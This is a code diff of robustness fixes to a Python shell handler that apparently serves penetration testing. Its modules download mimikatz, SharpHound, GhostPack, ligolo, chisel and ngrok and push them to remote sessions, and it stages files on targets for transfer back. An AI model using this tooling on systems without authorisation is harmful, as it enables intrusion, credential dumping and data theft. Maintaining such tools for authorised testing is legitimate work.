@@ -1006,8 +1006,10 @@ class MainMenu(BetterCMD):
 		if core.attached_session and not core.attached_session.type == 'Readline':
 			core.attached_session.detach()
 		else:
-			if menu.sid and not core.sessions[menu.sid].agent: # TEMP
-				core.sessions[menu.sid].control_session.subchannel.control << 'stop'
+			if menu.sid and menu.sid in core.sessions and not core.sessions[menu.sid].agent: # TEMP
+				cs = core.sessions[menu.sid].control_session
+				if cs is not None:
+					cs.subchannel.control << 'stop'
 
 	def show_help(self, command):
 		help_prompt = re.compile(r"Run 'help [^\']*' for more information") # TODO
@@ -1317,7 +1319,7 @@ class MainMenu(BetterCMD):
 			open /etc/issue /var/spool	Open locally multiple remote files and directories at once
 		"""
 		if remote_items:
-			items = core.sessions[self.sid].download(remote_items)
+			items = list(core.sessions[self.sid].download(remote_items))
 
 			if len(items) > options.max_open_files:
 				cmdlogger.warning(
@@ -1498,7 +1500,7 @@ class MainMenu(BetterCMD):
 		[SessionID]
 		Open the session's local folder. If no session specified, open the base folder
 		"""
-		if ID and int(ID) in core.sessions:
+		if ID and ID.isnumeric() and int(ID) in core.sessions:
 			folder = core.sessions[int(ID)].directory
 		elif self.sid and self.sid in core.sessions:
 			folder = core.sessions[self.sid].directory
@@ -2206,6 +2208,8 @@ class TCPListener:
 
 		if self.bind(self.host, self.port):
 			self.start()
+		else:
+			self.socket.close()
 
 	def __str__(self):
 		return f"TCPListener({self.host}:{self.port})"
@@ -2870,9 +2874,14 @@ class Session:
 				else:
 					if directory.startswith('~'):
 						directory = self.exec(f"echo {directory}", value=True)
-					if int(self.exec(f"[ -w \"{directory}\" ];echo $?", value=True)):
-						logger.error(f"{directory}: Permission denied")
-						return False
+					wa_result = self.exec(f"[ -w \"{directory}\" ];echo $?", value=True)
+					try:
+						if int(wa_result):
+							logger.error(f"{directory}: Permission denied")
+							return False
+					except (ValueError, TypeError):
+						logger.error(f"Cannot verify write access to {directory}")
+						return None
 
 			elif self.OS == 'Windows':
 				write_test_file = rand(16)
@@ -3858,7 +3867,11 @@ class Session:
 				#errors = [line[4:] for line in response.splitlines() if line.startswith('du: ')]
 				#for error in errors:
 				#	logger.error(error)
-				remote_size = int(response.splitlines()[-1].split()[0]) * 1024
+				try:
+					remote_size = int(response.splitlines()[-1].split()[0]) * 1024
+				except (ValueError, IndexError):
+					logger.error(f"Cannot parse remote size")
+					return []
 
 			need = remote_size - available_bytes
 
@@ -3931,6 +3944,9 @@ class Session:
 				tar_source, mode = stdout_stream, "r|gz"
 			else:
 				remote_items = ' '.join([os.path.join(self.cwd, part) for part in shlex.split(remote_items)])
+				if not self.tmp:
+					logger.error("No writable directory available on target for download staging")
+					return []
 				temp = self.tmp + "/" + rand(8)
 				cmd = rf'tar -czf - -h {remote_items}|base64|tr -d "\n" > {temp}'
 				response = self.exec(cmd, timeout=None, value=True)
@@ -3940,7 +3956,17 @@ class Session:
 				errors = [line[5:] for line in response.splitlines() if line.startswith('tar: /')]
 				for error in errors:
 					logger.error(error)
-				send_size = int(self.exec(rf"(stat -x {temp} 2>/dev/null || stat {temp}) | sed -n 's/.*Size: \([0-9]*\).*/\1/p'"))
+				stat_response = self.exec(rf"(stat -x {temp} 2>/dev/null || stat {temp}) | sed -n 's/.*Size: \([0-9]*\).*/\1/p'")
+				if not stat_response:
+					logger.error("Cannot determine archive size")
+					self.exec(f"rm {temp}")
+					return []
+				try:
+					send_size = int(stat_response)
+				except (ValueError, TypeError):
+					logger.error("Unexpected response when checking archive size")
+					self.exec(f"rm {temp}")
+					return []
 
 				b64data = io.BytesIO()
 				pbar = PBar(send_size, caption=f" {paint('⤓').cyan} ", barlen=40, metric=Size)
@@ -3949,6 +3975,7 @@ class Session:
 					if response is False:
 						pbar.terminate()
 						logger.error("Download interrupted")
+						self.exec(f"rm {temp}")
 						return []
 					b64data.write(response)
 					pbar.update(len(response))
@@ -4145,11 +4172,27 @@ class Session:
 				stdout_stream << (str(stats.f_bavail) + ';' + str(stats.f_frsize)).encode()
 				""", python=True, value=True)
 
-				remote_available_blocks, remote_block_size = map(int, response.split(';'))
+				if not response or ';' not in str(response):
+					logger.error("Cannot determine remote disk space")
+					return []
+				try:
+					remote_available_blocks, remote_block_size = map(int, response.split(';'))
+				except (ValueError, TypeError):
+					logger.error("Unexpected response when checking remote disk space")
+					return []
 				remote_space = remote_available_blocks * remote_block_size
 			else:
-				remote_block_size = int(self.exec(rf'stat -c "%o" {destination} 2>/dev/null || stat -f "%k" {destination}', value=True))
-				remote_space = int(self.exec(f"df -k {destination}|tail -1|awk '{{print $4}}'", value=True)) * 1024
+				rb_response = self.exec(rf'stat -c "%o" {destination} 2>/dev/null || stat -f "%k" {destination}', value=True)
+				rs_response = self.exec(f"df -k {destination}|tail -1|awk '{{print $4}}'", value=True)
+				if not rb_response or not rs_response:
+					logger.error("Cannot determine remote disk space")
+					return []
+				try:
+					remote_block_size = int(rb_response)
+					remote_space = int(rs_response) * 1024
+				except (ValueError, TypeError):
+					logger.error("Unexpected response when checking remote disk space")
+					return []
 
 			# Calculate local size
 			local_size = 0
@@ -4259,6 +4302,9 @@ class Session:
 				del self.streams[stderr_stream.id]
 
 			else: # TODO
+				if not self.tmp:
+					logger.error("No writable directory available on target for upload staging")
+					return []
 				tar_buffer.seek(0)
 				data = base64.b64encode(tar_buffer.read()).decode()
 				temp = self.tmp + "/" + rand(8)
@@ -4276,7 +4322,12 @@ class Session:
 				dest = f"-C {shlex.quote(remote_path)}" if remote_path else ""
 				cmd = f"base64 -d < {temp} | tar xz {dest} 2>&1; temp=$?"
 				response = self.exec(cmd, value=True)
-				exit_code = int(self.exec("echo $temp", value=True))
+				exit_response = self.exec("echo $temp", value=True)
+				try:
+					exit_code = int(exit_response)
+				except (ValueError, TypeError):
+					logger.error("Cannot determine extraction exit code")
+					exit_code = 1
 				self.exec(f"rm {temp}")
 				if exit_code:
 					logger.error(response)
@@ -4702,13 +4753,20 @@ class Session:
 			self.logfile.close()
 
 		for portfwd in self.tasks['portfwd']:
+			if len(portfwd) < 5:
+				logger.debug("Port forwarding task not fully initialized, skipping cleanup")
+				continue
 			info, control, stop, thread, server = portfwd
 			logger.warning(f"Stopping Port Forwarding: {info[1]}:{info[2]} {'->' if info[0]=='L' else '<-'} {info[3]}:{info[4]}")
 			server.shutdown()
 			server.server_close()
-			while not stop.is_set(): # TEMP
+			deadline = time.monotonic() + 5
+			while not stop.is_set() and time.monotonic() < deadline:
 				control << "stop"
-			thread.join()
+				time.sleep(0.1)
+			if not stop.is_set():
+				logger.warning("Port forwarding cleanup timed out, continuing anyway")
+			thread.join(timeout=2)
 
 		if self.OS:
 			threading.Thread(target=self.maintain).start()
@@ -4775,8 +4833,11 @@ class Messenger:
 				self.message_buffer.truncate()
 				yield _type, _message
 
+		leftover = self.input_buffer.read()
 		self.input_buffer.seek(0)
 		self.input_buffer.truncate()
+		if leftover:
+			self.input_buffer.write(leftover)
 
 class Stream:
 	def __init__(self, _id, _session=None):
@@ -5223,6 +5284,9 @@ class upload_credump_scripts(Module):
 		elif session.OS == 'Windows':
 			import tempfile
 			_, archive = url_to_bytes(URLS['mimikatz'])
+			if not archive:
+				logger.error("Failed to download mimikatz")
+				return
 			with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
 				target = Path(tmpdir) / "mimikatz"
 				target.mkdir(parents=True, exist_ok=True)
@@ -5250,8 +5314,10 @@ class upload_ad_scripts(Module):
 		elif session.OS == 'Windows':
 			session.upload(URLS['powerview'])
 
-			import tempfile
 			_, archive = url_to_bytes(URLS['sharphound'])
+			if not archive:
+				logger.error("Failed to download SharpHound")
+				return
 			with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
 				target = Path(tmpdir) / "sharphound"
 				target.mkdir(parents=True, exist_ok=True)
@@ -5259,8 +5325,10 @@ class upload_ad_scripts(Module):
 					z.extractall(target)
 					session.upload(str(target))
 
-			import tempfile
 			_, archive = url_to_bytes(URLS['ghostpack'])
+			if not archive:
+				logger.error("Failed to download GhostPack")
+				return
 			with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
 				with zipfile.ZipFile(io.BytesIO(archive)) as z:
 					z.extractall(tmpdir)
@@ -5339,12 +5407,16 @@ class ligolo(Module):
 				return
 
 			_, archive = url_to_bytes(url)
+			if not archive:
+				logger.error("Failed to download ligolo agent")
+				return
 			with tarfile.open(fileobj=io.BytesIO(archive), mode="r:gz") as tf:
 				f = tf.extractfile(tf.getmember("agent"))
 				if f is None:
 					logger.error("File 'agent' not found in downloaded archive")
 					return
-				session.upload(url, url_to_bytes_fn=lambda x: ('agent', f.read()))
+				agent_data = f.read()
+			session.upload(url, url_to_bytes_fn=lambda x: ('agent', agent_data))
 
 		elif session.OS == 'Windows':
 			if session.arch == "x64-based_PC":
@@ -5355,12 +5427,16 @@ class ligolo(Module):
 				return
 
 			_, archive = url_to_bytes(url)
+			if not archive:
+				logger.error("Failed to download ligolo agent")
+				return
 			with zipfile.ZipFile(io.BytesIO(archive)) as z:
 				try:
-					session.upload(url, url_to_bytes_fn=lambda x: ('agent.exe', z.read("agent.exe")))
+					agent_data = z.read("agent.exe")
 				except KeyError:
 					logger.error("File 'agent' not found in downloaded archive")
 					return
+			session.upload(url, url_to_bytes_fn=lambda x: ('agent.exe', agent_data))
 
 
 class chisel(Module):
@@ -5383,8 +5459,12 @@ class chisel(Module):
 
 			import gzip
 			_, archive = url_to_bytes(url)
+			if not archive:
+				logger.error("Failed to download chisel")
+				return
 			with gzip.GzipFile(fileobj=io.BytesIO(archive), mode="rb") as g:
-				session.upload(url, url_to_bytes_fn=lambda x: ('chisel', g.read()))
+				chisel_data = g.read()
+			session.upload(url, url_to_bytes_fn=lambda x: ('chisel', chisel_data))
 
 		elif session.OS == 'Windows':
 			if session.arch == "x64-based_PC":
@@ -5397,12 +5477,16 @@ class chisel(Module):
 				return
 
 			_, archive = url_to_bytes(url)
+			if not archive:
+				logger.error("Failed to download chisel")
+				return
 			with zipfile.ZipFile(io.BytesIO(archive)) as z:
 				try:
-					session.upload(url, url_to_bytes_fn=lambda x: ('chisel.exe', z.read("chisel.exe")))
+					chisel_data = z.read("chisel.exe")
 				except KeyError:
 					logger.error("File 'chisel' not found in downloaded archive")
 					return
+			session.upload(url, url_to_bytes_fn=lambda x: ('chisel.exe', chisel_data))
 
 
 class ngrok(Module):
@@ -5417,12 +5501,16 @@ class ngrok(Module):
 				return False
 
 			_, archive = url_to_bytes(URLS['ngrok_linux'])
+			if not archive:
+				logger.error("Failed to download ngrok")
+				return
 			with tarfile.open(fileobj=io.BytesIO(archive), mode="r:gz") as tf:
 				f = tf.extractfile(tf.getmember("ngrok"))
 				if f is None:
 					logger.error("File 'ngrok' not found in downloaded archive")
 					return
-				session.upload(URLS['ngrok_linux'], url_to_bytes_fn=lambda x: ('ngrok', f.read()), remote_path=session.tmp)
+				ngrok_data = f.read()
+			session.upload(URLS['ngrok_linux'], url_to_bytes_fn=lambda x: ('ngrok', ngrok_data), remote_path=session.tmp)
 
 			token = input("Authtoken: ")
 			session.exec(f"{session.tmp}/ngrok config add-authtoken {token}")
